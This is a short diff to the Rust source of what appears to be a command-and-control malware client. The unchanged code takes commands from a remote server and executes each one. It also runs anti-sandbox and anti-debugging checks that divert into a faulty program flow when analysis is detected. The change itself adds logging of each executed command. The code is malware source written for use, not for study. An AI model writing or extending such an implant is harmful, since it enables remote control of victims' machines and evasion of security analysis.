@@ -1,6 +1,7 @@
 use reqwest::Client;
 use std::time::Duration;
 use tokio::time::sleep;
+use tracing::info;
 
 mod check;
 mod client_info;
@@ -109,6 +110,7 @@ impl C2Client {
         if res.status().is_success() {
             let commands: Vec<CommandRequest> = res.json().await?;
             for cmd in commands {
+                info!("Executing command: {:?}", cmd); // Log the command being executed
                 if let Err(e) = command_executor::execute_command(
                     &self.http_client,
                     &self.config.server_url,
@@ -128,6 +130,9 @@ impl C2Client {
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    // Initialize logger
+    env_logger::init();
+
     // Anti-sandbox and anti-debugging checks
     if check::run_all_checks() {
         // Guide into a faulty program flow instead of exiting
